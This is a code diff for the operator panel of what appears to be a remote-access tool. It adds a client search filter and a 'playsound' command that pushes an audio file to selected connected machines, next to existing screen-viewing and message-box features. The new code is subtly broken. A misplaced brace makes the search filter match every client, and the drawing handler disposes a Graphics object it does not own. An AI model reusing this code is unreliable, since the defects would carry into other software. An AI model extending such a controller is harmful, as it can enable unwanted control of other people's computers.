@@ -9,6 +9,7 @@ using System;
 using System.Collections.Generic;
 using System.Drawing;
 using System.IO;
+using System.Linq;
 using System.Security.Cryptography;
 using System.Threading;
 using System.Threading.Tasks;
@@ -64,6 +65,37 @@ namespace Sweep.Forms
             _server.ClientConnected += (s, clientId) => {
                 _ = _server.SendMessageToClient(clientId, "ack"); // shush warning
             };
+
+            listView1.OwnerDraw = true;
+            listView1.DrawSubItem += (s, e) =>
+            {
+                string filterText = guna2TextBox1.Text.Trim();
+                e.DrawBackground();
+                e.DrawText();
+
+                if (!string.IsNullOrEmpty(filterText) && e.ColumnIndex == 0)
+                {
+                    int idx = e.SubItem.Text.IndexOf(filterText, StringComparison.OrdinalIgnoreCase);
+                    if (idx >= 0)
+                    {
+                        // Measure text before the match
+                        using (var g = e.Graphics)
+                        {
+                            var beforeMatch = e.SubItem.Text.Substring(0, idx);
+                            var matchText = e.SubItem.Text.Substring(idx, filterText.Length);
+                            var font = e.SubItem.Font;
+
+                            float x = e.Bounds.X + TextRenderer.MeasureText(g, beforeMatch, font, e.Bounds.Size, TextFormatFlags.NoPadding).Width;
+                            var size = TextRenderer.MeasureText(g, matchText, font, e.Bounds.Size, TextFormatFlags.NoPadding);
+
+                            g.FillRectangle(Brushes.Yellow, x, e.Bounds.Y, size.Width, e.Bounds.Height);
+                            g.DrawString(matchText, font, Brushes.Black, x, e.Bounds.Y);
+                        }
+                    }
+                }
+            };
+
+
         }
 
         private async void seescreen_Click(object sender, EventArgs e)
@@ -109,12 +141,14 @@ namespace Sweep.Forms
 
         private void home_Click(object sender, EventArgs e)
         {
+            guna2TextBox1.Visible = true;
             listView1.Visible = true;
             logsview.Visible = false;
         }
 
         private void logs_Click(object sender, EventArgs e)
         {
+            guna2TextBox1.Visible = false;
             listView1.Visible = false;
             logsview.Visible = true;
             logsnum = 0;
@@ -485,9 +519,85 @@ namespace Sweep.Forms
                 if (conn != null)
                 {
                     var wind = new MsgBox();
+                    wind.serverHost = _server;
+                    wind.clientid = item.ID;
                     wind.Show();
                 }
             }
+        }
+
+        private async void playSoundToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (var obj in listView1.SelectedObjects)
+            {
+                ClientInfo item = (ClientInfo)obj;
+                if (item == null) { return; }
+                ;
+
+                ClientConnection conn = _server.GetConnectionById(item.ID);
+                if (conn != null)
+                {
+                    var sounddialog = new OpenFileDialog(); 
+                    sounddialog.DefaultExt = "mp3";
+                    sounddialog.Filter = "Audio Files (*.mp3;*.wav;*.ogg)|*.mp3;*.wav;*.ogg";
+
+                    sounddialog.InitialDirectory = remembrance.GetAttribute<string>("soundfilepath") ?? Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+
+                    var dialog = sounddialog.ShowDialog();
+
+                    if (dialog != DialogResult.OK)
+                    {
+                        return;
+                    }
+
+                    remembrance.SetAttribute("soundfilepath", Path.GetDirectoryName(sounddialog.FileName));
+
+                    var filebytes = await ReadAllBytesAsync(sounddialog.FileName);
+
+                    await _server.SendFileBytesInline(conn.Id, filebytes, new JObject
+                    {
+                        ["command"] = "playsound",
+                        ["filename"] = Global.GenerateRandomString(10) + Path.GetFileName(sounddialog.FileName)
+                    }.ToString());
+                }
+            }
+        }
+
+        private void guna2TextBox1_TextChanged(object sender, EventArgs e)
+        {
+            string filterText = guna2TextBox1.Text.Trim();
+            if (string.IsNullOrEmpty(filterText))
+            {
+                listView1.UseFiltering = false;
+                listView1.ModelFilter = null;
+                listView1.RefreshObjects(listView1.Objects.Cast<object>().ToList());
+                return;
+            }
+
+            listView1.UseFiltering = true;
+            listView1.ModelFilter = new ModelFilter(model =>
+            {
+                var client = model as ClientInfo;
+                if (client == null) return false;
+
+                // Search all string properties of ClientInfo
+                foreach (var prop in typeof(ClientInfo).GetProperties())
+                {
+                    if (prop.PropertyType == typeof(string))
+                    {
+                        var value = prop.GetValue(client) as string;
+                        if (!string.IsNullOrEmpty(value) &&
+                            value.IndexOf(filterText, StringComparison.OrdinalIgnoreCase) >= 0)
+                            Console.WriteLine($"Found match in {prop.Name}: {value}");
+                        {
+                            return true;
+                        }
+                    }
+                }
+                return false;
+            });
+
+            listView1.RefreshObjects(listView1.Objects.Cast<object>().ToList());
         }
 
         /*protected override void OnDeactivate(EventArgs e)
